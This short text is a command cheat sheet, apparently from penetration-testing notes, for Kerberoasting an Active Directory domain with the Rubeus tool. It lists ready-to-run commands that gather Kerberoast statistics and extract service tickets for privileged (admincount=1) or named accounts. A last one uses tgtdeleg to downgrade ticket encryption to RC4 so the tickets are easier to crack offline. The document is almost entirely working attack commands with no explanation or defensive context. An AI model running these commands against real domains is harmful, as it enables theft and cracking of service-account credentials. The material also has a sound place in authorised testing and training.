

Getting stats
```powershell-session
.\Rubeus.exe kerberoast /stats
```

Extracting tickets with admincount flag set
```powershell-session
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

Extracting tickets for specific user account
```powershell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

Using tgtdeleg to downgrade aes to rc4

.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap